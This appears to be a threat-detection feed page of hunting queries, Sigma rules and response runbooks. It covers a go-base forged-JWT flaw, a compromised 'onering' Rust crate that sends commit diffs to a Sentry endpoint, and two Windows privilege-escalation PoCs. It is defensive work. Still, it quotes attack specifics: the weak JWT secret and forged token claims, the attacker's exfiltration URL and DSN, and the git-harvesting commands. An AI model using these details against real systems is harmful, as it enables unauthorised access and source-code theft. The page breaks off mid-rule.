Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Bearer-token access to dhax/go-base admin endpoints with extreme far-future JWT
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Bearer-token access to dhax/go-base admin endpoints with extreme far-future JWT AIExploitation Medium
Hunts for HTTP requests to the dhax/go-base boilerplate's protected API surface (/api/v1/admin/users, /api/v1/me, /api/v1/token/refresh) being served by a vulnerable instance of CVE-2026-48031. The PoC forges tokens signed with the hardcoded secret 'random' and uses iat=9999999000 / exp=9999999999 (year 2286) — we pivot on the specific URI paths exposed by the boilerplate and surface successful 200 responses for triage against expected admin clients. Rationale: Pivots on the three article-specific URI stems the dhax/go-base boilerplate exposes (pwdless/api.go and admin router) — these strings are unique to this codebase, not a generic web pattern. The 200-OK filter narrows to successful auth, which under CVE-2026-48031 means either a legitimate admin or a forged-token attacker; the analyst then triages the ClientIP/UA. Cross-checked against the GHSA advisory and PR #31 commit diff for the authoritative endpoint list. Cross-checked against: • https://github.com/advisories/GHSA-mqq6-462x-jxmm • https://github.com/dhax/go-base/pull/31 • https://attack.mitre.org/techniques/T1550/001/ • https://attack.mitre.org/techniques/T1606/
ATT&CKT1550.001 T1606 T1078
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate admin user session calling /api/v1/admin/users from the admin UI
  • Frontend SPA periodically calling /api/v1/me for session refresh during normal user activity
  • Token-refresh background job from a mobile client hitting /api/v1/token/refresh on schedule
  • Internal CI/CD smoke tests against a staging go-base instance with stub admin creds
  • Security scanner (Burp / OWASP ZAP) authenticated scan during a scheduled pentest window
Suppression filter
| where User !in~ ("admin-svc", "prod-admin", "ci-bot") and ClientIP !in ("<corp-egress-cidrs>") and UA !has_any ("BurpSuite", "ZAP", "prometheus-scraper")
Response runbook
1) Triage — pull the source IP and user-agent for matching hits; check whether the deployed go-base version is past commit cc82b9740fa6 (PR#31) and whether AUTH_JWT_SECRET in the running env is still 'random' / empty / a known-weak value. If the secret is rotated and strong, downgrade severity. 2) Contain — if the secret is weak: immediately rotate AUTH_JWT_SECRET to a 32+ byte value via `openssl rand -base64 32`, redeploy, and force all clients to re-authenticate (existing tokens become invalid). Block the suspect ClientIPs at the WAF until clean. 3) Hunt — pivot on the same source IP across all auth-related URIs, then search for any account whose token payload carries iat/exp values >= year 2100 by inspecting application logs of decoded JWT claims; review IAM/audit logs for new admin-role assignments or data exfil from the affected account.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteUrl has_any ("/api/v1/admin/users", "/api/v1/me", "/api/v1/token/refresh")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","safari.exe","opera.exe")
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          RemoteUrl, RemoteIP, RemotePort, Protocol
| order by Timestamp desc
// Web-tier hunt for forged-JWT calls against the go-base API surface.
// Pivots on the three article-specific URI stems served by the boilerplate.
let GoBasePaths = dynamic(["/api/v1/admin/users", "/api/v1/me", "/api/v1/token/refresh"]);
union isfuzzy=true
  ( W3CIISLog
    | where TimeGenerated > ago(7d)
    | where csUriStem has_any (GoBasePaths)
    | where scStatus == 200
    | project TimeGenerated, Source="IIS", Host=Computer, ClientIP=cIP,
              Method=csMethod, Path=csUriStem, Query=csUriQuery,
              UA=csUserAgent, User=csUserName ),
  ( AppServiceHTTPLogs
    | where TimeGenerated > ago(7d)
    | where CsUriStem has_any (GoBasePaths)
    | where ScStatus == 200
    | project TimeGenerated, Source="AppService", Host=CsHost, ClientIP=CIp,
              Method=CsMethod, Path=CsUriStem, Query=CsUriQuery,
              UA=UserAgent, User=CsUsername ),
  ( CommonSecurityLog
    | where TimeGenerated > ago(7d)
    | where RequestURL has_any (GoBasePaths)
    | where toint(EventOutcome) == 200 or DeviceAction in~ ("allow","permit","pass")
    | project TimeGenerated, Source=DeviceProduct, Host=DestinationHostName, ClientIP=SourceIP,
              Method=RequestMethod, Path=RequestURL, Query="",
              UA=RequestClientApplication, User=SourceUserName )
| summarize Hits=count(), FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated),
            UAs=make_set(UA, 5), Paths=make_set(Path, 5)
            by Source, Host, ClientIP, User
| order by LastSeen desc

Compromised Rust crate onering performs code exfiltration

Aikido
2026-06-10 7 use cases 3 techniques 6 kill-chain phases detected

The compromised onering Rust crate v1.4.1 on crates.io shipped a malicious build.rs that exfiltrates the diff of your latest commit to a hosted Sentry endpoint every time you build. Category: Vulnerabilities & Threats

ATT&CKT1176 T1190 T1195.002
Domainso4511539639222272.ingest.de.sentry.io
Click any ATT&CK pill below to open it on the Matrix
Phase 1
Reconnaissance
Detected

Weaponization
—
Phase 3
Delivery
Detected
Phase 4
Exploitation
Detected

Installation
Detected

Detected

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] git diff HEAD^ HEAD spawned by Rust cargo build script (onering source-code collection) · Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] DNS/URL egress to malicious onering Sentry org subdomain (o4511539639222272) · [LLM] curl POSTing application/x-sentry-envelope from Rust cargo build tree (onering exfil) · Infostealer — non-browser process accessing browser cookie/login DBs
DNS/URL egress to malicious onering Sentry org subdomain (o4511539639222272) AIActions on Objectives High
Hunts any host resolving or POSTing to the Sentry organization subdomain hard-coded into onering 1.4.1's build.rs, or any HTTP request carrying its DSN public key / project ID. The org/project IDs are unique to the attacker — a hit is high-fidelity supply-chain exfil. Rationale: Anchors on the three IOCs the article publishes verbatim: host `o4511539639222272.ingest.de.sentry.io`, DSN public key `8197ee42c4f59c83f4cc6d48f5bae821`, project path `4511539669368912/envelope/`. Sentry org IDs are globally unique, so this is article-specific even after the attacker rotates payloads. Cross-checked the Sentry-as-exfil-channel pattern against the Sicoob NuGet writeup and ANY.RUN reports of other malicious Sentry ingest endpoints. Cross-checked against: • https://www.hendryadrian.com/malicious-nuget-package-impersonates-sicoob-sdk-to-exfiltrate-banking-certificates-and-passwords/ • https://any.run/report/77c7be8f3b17c5e0e82b86fef02131e4a64720eb13e0d04bdcbb12d1ed3b0aec/d6f2ed74-a148-4ea8-948a-6e9b8c44cca0 • https://github.com/cenotelie/onering/issues/1
ATT&CKT1567.002 T1195.002 T1071.001
Data sourcesNetwork_Traffic.All_Traffic Web.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Other Sentry-using applications in the org legitimately phoning home (different org subdomain — query is scoped to org `o4511539639222272` only, so this should be nil)
  • Threat-intel sandbox detonations of the malicious crate hitting the IOC from a researcher VM
  • Security researcher / IR team manually browsing the IOC URL for triage
  • Outbound traffic from a developer who installed onering before the IOC was published, then was blocked at proxy (still triggers DNS-only detections)
Suppression filter
| where InitiatingProcessFileName !in~ ("sentry-cli.exe","sentry.exe")  // legit Sentry SDK uploads scoped to known org — verify your org's Sentry org ID is NOT o4511539639222272
Response runbook
1) Triage: pull all `DeviceNetworkEvents` / `DnsEvents` hits and identify the initiating process — confirm it descends from `cargo`, `build-script-build`, or `rustc`. Pull the host's `Cargo.lock` and grep for `onering` to verify the dependency. 2) Contain: isolate the developer/CI host from the network; revoke any SSH/git/cloud credentials present in `~/.ssh`, `~/.cargo`, environment, or recent shell history (the build.rs exfils source code, but the host is also untrusted now). Block the Sentry org subdomain at the egress proxy and DNS sinkhole. 3) Hunt: search all repos built on the affected host for `onering = "1.4.1"` in `Cargo.toml`/`Cargo.lock`; assume any commit diff produced in the build window has leaked; pivot UC2 + UC3 to find sibling host activity.
// onering 1.4.1 hard-codes this Sentry org+project — both IDs are attacker-unique
let IocHost = "o4511539639222272.ingest.de.sentry.io";
let IocDsn  = "8197ee42c4f59c83f4cc6d48f5bae821";
let IocProj = "4511539669368912/envelope";
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteUrl has_any (IocHost, IocDsn, IocProj)
   or AdditionalFields has_any (IocHost, IocDsn, IocProj)
| project Timestamp, DeviceName, InitiatingProcessAccountName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, InitiatingProcessParentFileName,
          RemoteIP, RemotePort, RemoteUrl
| order by Timestamp desc
// Catch on DNS resolution AND any URL field that surfaces the IOC
let IocHost = "o4511539639222272.ingest.de.sentry.io";
let IocDsn  = "8197ee42c4f59c83f4cc6d48f5bae821";
let IocProj = "4511539669368912/envelope";
union isfuzzy=true
  (DnsEvents
    | where TimeGenerated > ago(7d)
    | where Name has IocHost
    | project TimeGenerated, Computer, ClientIP, Url=Name, Source="DnsEvents"),
  (ImWebSession
    | where TimeGenerated > ago(7d)
    | where Url has_any (IocHost, IocDsn, IocProj) or HttpHostName has IocHost
    | project TimeGenerated, Computer=DvcHostname, ClientIP=SrcIpAddr, Url, Source="ImWebSession"),
  (CommonSecurityLog
    | where TimeGenerated > ago(7d)
    | where RequestURL has_any (IocHost, IocDsn, IocProj) or DestinationHostName has IocHost
    | project TimeGenerated, Computer=SourceHostName, ClientIP=SourceIP, Url=RequestURL, Source="CommonSecurityLog")
| order by TimeGenerated desc

git diff HEAD^ HEAD spawned by Rust cargo build script (onering source-code collection) AIInstallation High
Hunts the exact git invocations the onering 1.4.1 build.rs uses to harvest source: `git diff HEAD^ HEAD` and `git log -n 1 --pretty=format:{"commit":"%H"...}` — but ONLY when parented by a Rust build process (build-script-build / cargo / rustc) or running under a target/{debug,release}/build/ folder. The parent+argv pair is what makes it high-fidelity. Rationale: The build.rs in the article literally calls `git(&project_path, &["log","-n","1",r#"--pretty=format:{"commit":"%H",..."# ])` and `git(&project_path, &["diff","HEAD^","HEAD"])`. Both argv shapes are uncommon outside of CI release tooling and are surgically anchored. Pairing on a Rust-build parent (build-script-build is cargo's compiled build-script binary placed under target/<profile>/build/<crate>-<hash>/) keeps the FP rate near zero. Cross-checked against: • https://www.sentinelone.com/labs/cratedepression-rust-supply-chain-attack-infects-cloud-ci-pipelines-with-go-malware/ • https://rust-secure-code.github.io/rust-supply-chain-security/build.html • https://github.com/cenotelie/onering/issues/1
ATT&CKT1195.002 T1059 T1213.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • vergen / git-version / built crates legitimately calling git from build.rs to embed build metadata (but they typically use `git rev-parse HEAD` not `diff HEAD^ HEAD`)
  • Developer's IDE running git diff via a watcher while a cargo build is concurrently active (different parent process tree)
  • Custom CI build.rs scripts that intentionally generate a changelog from `git log` (rare; rarely uses the JSON pretty-format)
  • Cargo workspaces with `cargo-release` or similar publish tooling running diffs
Suppression filter
| where not (ProcessCommandLine has "rev-parse" or ProcessCommandLine has "describe --tags")  // common vergen/git-version build.rs invocations use these, not diff HEAD^ HEAD
Response runbook
1) Triage: confirm parent process is build-script-build / cargo / rustc and the working directory is under `target/<profile>/build/<crate>-<hash>/`. List the crate name from the parent path — if it begins with `onering-` the case is confirmed. 2) Contain: kill the cargo build, network-isolate the host, and revoke any developer credentials present locally (SSH keys, git PATs, cloud SDK tokens, npm/cargo tokens). Treat all source the host has built recently as leaked. 3) Hunt: pivot UC1 (Sentry network egress) on the same host and time window; sweep all repos for `onering` in Cargo.{toml,lock}; check `~/.cargo/registry/cache/` for the 1.4.1 tarball; query other CI runners that built the same workspace.
// onering 1.4.1 build.rs runs: git log -n 1 --pretty=format:{...} AND git diff HEAD^ HEAD
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("git.exe","git")
| where ProcessCommandLine has_any ("diff HEAD^ HEAD",
                                    @'--pretty=format:{"commit":"%H"',
                                    "-n 1 --pretty=format")
| where InitiatingProcessFileName matches regex @"(?i)^(build[-_]script[-_]build(\.exe)?|cargo(\.exe)?|rustc(\.exe)?)$"
    or InitiatingProcessFolderPath has @"\target\debug\build\"
    or InitiatingProcessFolderPath has @"\target\release\build\"
    or InitiatingProcessFolderPath matches regex @"(?i)/target/(debug|release)/build/"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath,
          InitiatingProcessParentFileName
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where NewProcessName endswith @"\git.exe" or NewProcessName endswith "/git"
| where CommandLine has_any ("diff HEAD^ HEAD",
                              @'--pretty=format:{"commit":"%H"',
                              "-n 1 --pretty=format")
| where ParentProcessName matches regex @"(?i)(build[-_]script[-_]build(\.exe)?|cargo(\.exe)?|rustc(\.exe)?)$"
    or ParentProcessName has @"\target\debug\build\"
    or ParentProcessName has @"\target\release\build\"
    or ParentProcessName matches regex @"(?i)/target/(debug|release)/build/"
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName, ProcessId
| order by TimeGenerated desc
title: Git diff/log Harvesting Under Rust Cargo Build Script (onering)

status: experimental
description: A git binary invoked with `diff HEAD^ HEAD` or the malicious build.rs pretty-format string under a Rust cargo build process tree. Matches onering 1.4.1's build-time source code harvester.
references:
  - https://www.aikido.dev/blog/compromised-rust-crate-onering-performs-code-exfiltration
author: SOC Detection Engineering
date: 2026/06/10
tags:

  - attack.t1195.002
  - attack.t1213.003
  - attack.t1059
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\git.exe'
  selection_cmd:
    CommandLine|contains:
      - 'diff HEAD^ HEAD'
      - '--pretty=format:{"commit":"%H"'
      - '-n 1 --pretty=format'
  selection_parent_proc:
    ParentImage|endswith:
      - '\build-script-build.exe'

      - '\cargo.exe'
      - '\rustc.exe'
  selection_parent_path:

      - '\target\debug\build\'
      - '\target\release\build\'
  condition: selection_img and selection_cmd and (selection_parent_proc or selection_parent_path)
level: high
source:windows.sysmon @EventID:1 (@Image:(*\\git.exe OR *\\GIT.EXE OR *\\Git.exe) OR @process.name:(git.exe OR git)) (@CommandLine:*"diff HEAD^ HEAD"* OR @CommandLine:*"-n 1 --pretty=format"* OR @CommandLine:*"\"commit\":\"%H\""*) (@ParentImage:(*\\build-script-build.exe OR *\\build_script_build.exe OR *\\cargo.exe OR *\\rustc.exe OR *\\BUILD-SCRIPT-BUILD.EXE) OR @ParentImage:(*\\target\\debug\\build\\* OR *\\target\\release\\build\\* OR *\\TARGET\\DEBUG\\BUILD\\*))
#event_simpleName=ProcessRollup2 ImageFileName=/\\git(\.exe)?$/i (CommandLine=/diff HEAD\^ HEAD/i OR CommandLine=/--pretty=format:\{"commit":"%H"/i OR CommandLine=/-n 1 --pretty=format/i)
| (ParentBaseFileName=/(build[-_]script[-_]build|cargo|rustc)\.exe$/i OR ParentImageFileName=/\\target\\(debug|release)\\build\\/i)
| groupBy([aid, ComputerName, UserName, CommandLine, ParentImageFileName], function=count())

curl POSTing application/x-sentry-envelope from Rust cargo build tree (onering exfil) AIActions on Objectives High
Catches the curl invocation wired into onering 1.4.1's build.rs: curl POSTing to a Sentry `/envelope/` endpoint with the `application/x-sentry-envelope` content-type, parented by a Rust build process. This is the exact moment the harvested source code leaves the host. Rationale: The article shows the exfil function literally calls `request("POST", "https://o4511539639222272.ingest.de.sentry.io/api/4511539669368912/envelope/", &["Accept: application/json","Content-Type: application/x-sentry-envelope"], &payload)` — and notes that on Windows/Mac it shells out via curl. Three anchors stack: curl binary + Sentry envelope content-type + cargo-build parent. Each alone has FPs; together the combination is article-unique. Cross-checked against: • https://www.hendryadrian.com/malicious-nuget-package-impersonates-sicoob-sdk-to-exfiltrate-banking-certificates-and-passwords/ • https://github.com/cenotelie/onering/issues/1
ATT&CKT1567.002 T1195.002 T1071.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate Rust crate using sentry-rust SDK at build time (extremely rare — Sentry SDK init typically runs at app-start, not build)
  • Developer manually testing a curl envelope post during integration work, parented by their shell rather than cargo (parent-process predicate filters this out)
  • Custom build.rs that legitimately ships build telemetry to the company's own Sentry org (different org subdomain; rule above also matches the unique org/DSN strings, so corp Sentry won't trigger unless that's their org ID)
  • CI runners with a cargo-cache warmer that pre-fetches dependencies (no curl with envelope content-type)
Suppression filter
| where InitiatingProcessFileName !endswith "sentry-cli.exe"  // legit sentry-cli uploads use envelope content-type but won't be parented by a cargo build script
Response runbook
1) Triage: extract the full curl `--data-binary` / stdin payload from the command line — it should contain a base64-encoded git diff. Identify the source repository from the parent process working directory. 2) Contain: kill the build, isolate the host, block the Sentry org subdomain at egress, and treat the diff as exfiltrated. Rotate any secrets that may have appeared in recent commit diffs (env files, config, keys committed by mistake) — onering exfils the FULL HEAD diff every build. 3) Hunt: cross-reference UC1 hits to confirm the POST completed; sweep `Cargo.lock` across the org for `onering` 1.4.1; audit other repos built on shared CI runners for the same time window — the article notes the maintainer's GitHub repo is also compromised, so `git` source installs are NOT a safe alternative.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("curl.exe","curl")
| where ProcessCommandLine has_any ("application/x-sentry-envelope",
                                    "ingest.de.sentry.io",
                                    "/envelope/",
                                    "o4511539639222272",
                                    "8197ee42c4f59c83f4cc6d48f5bae821")
| where InitiatingProcessFileName matches regex @"(?i)^(build[-_]script[-_]build(\.exe)?|cargo(\.exe)?|rustc(\.exe)?)$"
    or InitiatingProcessFolderPath has @"\target\debug\build\"
    or InitiatingProcessFolderPath has @"\target\release\build\"
    or InitiatingProcessFolderPath matches regex @"(?i)/target/(debug|release)/build/"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath,
          InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where NewProcessName endswith @"\curl.exe" or NewProcessName endswith "/curl"
| where CommandLine has_any ("application/x-sentry-envelope",
                              "ingest.de.sentry.io",
                              "/envelope/",
                              "o4511539639222272",
                              "8197ee42c4f59c83f4cc6d48f5bae821")
| where ParentProcessName matches regex @"(?i)(build[-_]script[-_]build(\.exe)?|cargo(\.exe)?|rustc(\.exe)?)$"
    or ParentProcessName has @"\target\debug\build\"
    or ParentProcessName has @"\target\release\build\"
    or ParentProcessName matches regex @"(?i)/target/(debug|release)/build/"
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName, ProcessId
| order by TimeGenerated desc

RoguePlanet Defender race condition - MsMpEng.exe spawns SYSTEM shell AIExploitation High
Detects Microsoft Defender's antimalware service (MsMpEng.exe) launching a command interpreter or LOLBin as NT AUTHORITY\SYSTEM. This is the exact behavior of Chaotic Eclipse's RoguePlanet PoC released alongside June 2026 Patch Tuesday - a race condition in Defender that yields a SYSTEM-level cmd.exe. Rationale: Article explicitly states RoguePlanet 'could be used to spawn a Windows command prompt with SYSTEM privileges' via a Defender race condition. MsMpEng.exe spawning interactive shells is a violation of the documented Defender behavior model and pairs the named binary (MsMpEng.exe) with the named outcome (SYSTEM cmd.exe) - both anchors come from the article body.
ATT&CKT1068 T1562.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Defender tamper protection telemetry collection invoking diagnostic helpers
  • Microsoft signed MpCmdRun.exe maintenance routines being misclassified as MsMpEng.exe descendants by some EDR collectors
  • Third-party EDR/AV co-existence shims that wrap MpCmdRun under MsMpEng for telemetry forwarding
  • Lab/research hosts running Defender exploit harnesses
  • Windows feature-update servicing temporarily reparenting helper processes during Defender platform update
Suppression filter
| where InitiatingProcessCommandLine !has "MpCmdRun" and ChildCmd !has "MpDefenderCoreService" and DeviceName !startswith "LAB-"
Response runbook
1. Triage: Pull the full process tree on the host - what spawned MsMpEng.exe? Confirm Defender platform version and whether the host has KB for June 2026 cumulative update installed. Check ChildCmd for actor follow-on commands (whoami, net user, dir of admin shares). 2. Contain: Isolate the host via Defender LiveResponse or network isolation; preserve the cmd/powershell.exe process memory before kill; rotate any credentials cached on the host. 3. Hunt: Search the past 30d for any other MsMpEng.exe -> shell parent/child events org-wide; pivot on any binaries written by the SYSTEM cmd.exe descendants via DeviceFileEvents; correlate with DeviceTvmSoftwareVulnerabilities to find still-unpatched hosts at risk of the same chain.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "MsMpEng.exe"
| where FileName has_any ("cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","regsvr32.exe","mshta.exe","wmic.exe","wscript.exe","cscript.exe")
| where AccountName =~ "system" or ProcessIntegrityLevel =~ "System"
| project Timestamp, DeviceName, AccountName,
          ParentFile = InitiatingProcessFileName,
          ParentCmd  = InitiatingProcessCommandLine,
          ChildFile  = FileName,
          ChildCmd   = ProcessCommandLine,
          ChildIntegrity = ProcessIntegrityLevel,
          SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where ParentProcessName endswith "\\MsMpEng.exe"
| extend ChildName = tolower(tostring(split(NewProcessName,"\\")[-1]))
| where ChildName in~ ("cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","regsvr32.exe","mshta.exe","wmic.exe","wscript.exe","cscript.exe")
| where TargetUserSid =~ "S-1-5-18" or SubjectUserSid =~ "S-1-5-18"
| project TimeGenerated, Computer, Account, TargetUserName, NewProcessName, CommandLine, ParentProcessName, TokenElevationType
| order by TimeGenerated desc
title: MsMpEng.exe Spawning Shell or LOLBin as SYSTEM (RoguePlanet PoC)
id: 9b1c2e5d-3c0c-4a1e-9e16-3a3a8f3f4d50
status: experimental
description: Detects Microsoft Defender antimalware service (MsMpEng.exe) spawning command-line interpreters or LOLBins, characteristic of the RoguePlanet race-condition exploit published by Chaotic Eclipse alongside Microsoft's June 2026 Patch Tuesday release.
references:
  - https://thehackernews.com/2026/06/microsoft-patches-record-206-flaws.html
author: Detection Engineering
date: 2026/06/10
tags:
  - attack.defense_evasion
  - attack.t1562.001
  - attack.privilege_escalation
  - attack.t1068
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\MsMpEng.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\rundll32.exe'
      - '\regsvr32.exe'
      - '\mshta.exe'
      - '\wmic.exe'
      - '\wscript.exe'
      - '\cscript.exe'
  condition: selection
falsepositives:
  - None known. MsMpEng.exe is not expected to spawn user-facing shells under any benign condition.
level: high
source:windows.security @EventID:4688 @ParentProcessName:(*\MsMpEng.exe OR *\msmpeng.exe OR *\MSMPENG.EXE) @NewProcessName:(*\cmd.exe OR *\CMD.EXE OR *\powershell.exe OR *\PowerShell.exe OR *\POWERSHELL.EXE OR *\pwsh.exe OR *\rundll32.exe OR *\regsvr32.exe OR *\mshta.exe OR *\wmic.exe OR *\wscript.exe OR *\cscript.exe) @TargetUserSid:S-1-5-18
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^MsMpEng\.exe$/i
| ImageFileName=/\\(cmd|powershell|pwsh|rundll32|regsvr32|mshta|wmic|wscript|cscript)\.exe$/i
| UserName=/SYSTEM/i OR UserSid="S-1-5-18"
| groupBy([aid, ComputerName, ImageFileName, CommandLine, ParentBaseFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as process values(Processes.process_path) as process_path values(Processes.user) as user values(Processes.process_integrity_level) as integrity_level from datamodel=Endpoint.Processes where Processes.parent_process_name="MsMpEng.exe" Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","regsvr32.exe","mshta.exe","wmic.exe","wscript.exe","cscript.exe") by Processes.dest Processes.parent_process_name Processes.process_name Processes.process_id _time span=1m | `drop_dm_object_name(Processes)` | where match(user,"(?i)SYSTEM") OR match(integrity_level,"(?i)System") | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as process values(Processes.process_path) as process_path values(Processes.user) as user values(Processes.process_integrity_level) as integrity_level from datamodel=Endpoint.Processes where Processes.parent_process_name="MsMpEng.exe" Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","regsvr32.exe","mshta.exe","wmic.exe","wscript.exe","cscript.exe") by Processes.dest Processes.parent_process_name Processes.process_name Processes.process_id _time span=1m | `drop_dm_object_name(Processes)` | where match(user,"(?i)SYSTEM") OR match(integrity_level,"(?i)System") | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
CTFMON privilege escalation (GreenPlasma / CVE-2026-45586) - ctfmon.exe spawning shells or elevated AIInstallation Medium
Hunts for ctfmon.exe (Collaborative Translation Framework) spawning shells/LOLBins, or executing at High/System integrity when its initiating user is a normal interactive account - the post-exploitation footprint of the GreenPlasma LPE PoC patched as CVE-2026-45586. Rationale: Article names CVE-2026-45586 as the CTFMON privilege-escalation flaw and ties it explicitly to Chaotic Eclipse's GreenPlasma PoC. ctfmon.exe legitimately runs as a Medium-integrity per-user input service - any High/System integrity execution, or any shell/LOLBin spawned as its child, is the observable footprint of a successful LPE.
ATT&CKT1068 T1134.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • IT/Helpdesk-deployed IME troubleshooters that wrap ctfmon under PowerShell
  • Citrix / VDI logon scripts that interact with ctfmon for keyboard layout fixes
  • Accessibility tooling that invokes ctfmon as a parent for input automation
  • Custom corporate language packs running ctfmon with elevated permissions during install
  • EDR provider sensors that artificially elevate ctfmon for telemetry purposes
Suppression filter
| where ParentCmd !has "language" and ChildCmd !has "InputMethod" and DeviceName !startswith "VDI-"
Response runbook
1. Triage: Inspect the ctfmon.exe command line - was it launched by explorer.exe (normal) or by an unexpected parent? Confirm the user is a non-admin and the host hasn't been patched against CVE-2026-45586. Examine ChildCmd for recon strings (whoami /priv, query session). 2. Contain: Suspend the offending child process, isolate the host via Defender LiveResponse, capture process memory for the ctfmon.exe and child PIDs before terminating. Force a password reset for the affected user. 3. Hunt: Search past 30d for ctfmon.exe at High/System integrity org-wide; pivot any subsequent files written by descendants via DeviceFileEvents; correlate with logon events to identify the exploiting account and any lateral movement using newly elevated tokens.
let CtfmonAsParent = DeviceProcessEvents
    | where Timestamp > ago(7d)
    | where InitiatingProcessFileName =~ "ctfmon.exe"
    | where FileName has_any ("cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","regsvr32.exe","mshta.exe")
    | project Timestamp, DeviceName, AccountName,
              Signal = "CtfmonSpawnedShell",
              ParentCmd = InitiatingProcessCommandLine,
              ChildFile = FileName,
              ChildCmd = ProcessCommandLine,
              ParentIntegrity = InitiatingProcessIntegrityLevel,
              ChildIntegrity = ProcessIntegrityLevel;
let CtfmonElevated = DeviceProcessEvents
    | where Timestamp > ago(7d)
    | where FileName =~ "ctfmon.exe"
    | where ProcessIntegrityLevel in ("High","System")
    | where AccountName !endswith "$" and AccountName !in~ ("system","local service","network service")
    | project Timestamp, DeviceName, AccountName,
              Signal = "CtfmonElevatedIntegrity",
              ParentCmd = InitiatingProcessCommandLine,
              ChildFile = FileName,
              ChildCmd = ProcessCommandLine,
              ParentIntegrity = InitiatingProcessIntegrityLevel,
              ChildIntegrity = ProcessIntegrityLevel;
union CtfmonAsParent, CtfmonElevated
| order by Timestamp desc
let CtfmonAsParent = SecurityEvent
    | where TimeGenerated > ago(7d)
    | where EventID == 4688
    | where ParentProcessName endswith "\\ctfmon.exe"
    | extend ChildName = tolower(tostring(split(NewProcessName,"\\")[-1]))
    | where ChildName in~ ("cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","regsvr32.exe","mshta.exe")
    | project TimeGenerated, Computer, Account, Signal="CtfmonSpawnedShell", NewProcessName, CommandLine, ParentProcessName, TokenElevationType;
let CtfmonElevated = SecurityEvent
    | where TimeGenerated > ago(7d)
    | where EventID == 4688
    | where NewProcessName endswith "\\ctfmon.exe"
    | where TokenElevationType in~ ("%%1936","%%1937")
    | where TargetUserName !endswith "$" and TargetUserSid !in~ ("S-1-5-18","S-1-5-19","S-1-5-20")
    | project TimeGenerated, Computer, Account, Signal="CtfmonElevatedIntegrity", NewProcessName, CommandLine, ParentProcessName, TokenElevationType;
union CtfmonAsParent, CtfmonElevated
| order by TimeGenerated desc
title: ctfmon.exe Spawning Command Interpreter (GreenPlasma CVE-2026-45586 PoC)
id: 4f3b6d0a-12c2-4d3e-9015-2f6c2a4e2f01
status: experimental
description: Detects the Windows Collaborative Translation Framework process (ctfmon.exe) spawning shells or LOLBins, the expected post-exploitation footprint of the GreenPlasma LPE patched as CVE-2026-45586 in Microsoft's June 2026 update.
references:

#event_simpleName=ProcessRollup2
